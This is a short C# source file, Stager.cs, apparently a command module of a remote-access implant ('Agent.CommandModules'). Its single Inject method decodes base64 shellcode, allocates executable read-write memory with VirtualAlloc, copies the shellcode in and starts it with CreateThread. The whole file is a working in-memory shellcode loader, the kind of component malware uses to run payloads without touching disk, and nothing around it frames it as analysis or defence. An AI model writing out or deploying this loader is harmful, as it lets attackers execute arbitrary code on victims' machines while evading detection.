// Stager.cs
// Injects payloads (DLL/shellcode) into memory

using System;
using System.Runtime.InteropServices;

namespace Agent.CommandModules
{
    public static class Stager
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("msvcrt.dll")]
        private static extern IntPtr memcpy(IntPtr dest, byte[] src, int count);

        public static string Inject(string shellcodeB64)
        {
            try
            {
                byte[] shellcode = Convert.FromBase64String(shellcodeB64);
                IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
                memcpy(addr, shellcode, shellcode.Length);
                CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                return "Shellcode injected.";
            }
            catch (Exception ex)
            {
                return "Stager error: " + ex.Message;
            }
        }
    }
}
